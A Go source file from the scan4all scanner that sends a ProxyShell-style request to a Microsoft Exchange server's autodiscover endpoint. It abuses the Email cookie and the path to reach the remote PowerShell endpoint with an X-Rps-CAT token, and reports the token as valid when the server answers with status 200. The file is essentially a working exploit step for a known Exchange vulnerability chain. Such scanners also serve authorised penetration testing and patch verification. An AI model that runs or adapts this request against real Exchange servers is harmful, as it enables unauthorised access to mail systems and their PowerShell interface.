package exchange

import (
	"encoding/json"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

func confirmtoken(target, token string) {
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}
	endpoint_addr := "/autodiscover/autodiscover.json?a=luci@ex.com/powershell/?X-Rps-CAT="
	m1 := map[string]string{
		"Accept-Encoding": "identity",
		"Cookie":          "Email=autodiscover/autodiscover.json?a=luci@ex.com",
		"Content-Type":    "application/soap+xml;charset=UTF-8",
	}
	if do, err := util.DoGet(target+endpoint_addr+token, m1); nil == err {
		defer do.Body.Close()
		if do.StatusCode == 200 {
			data, _ := json.Marshal(m1)
			util.SendLog(target+endpoint_addr+token, "exchange", "", string(data))
			fmt.Println("[+] the input token is valid to use!")
		} else {
			fmt.Println("[-] the input token is invalid!")
		}
	}
}

// 检查 token 有效性
func DoChecheToken(target, token string) {
	confirmtoken(target, token)
}
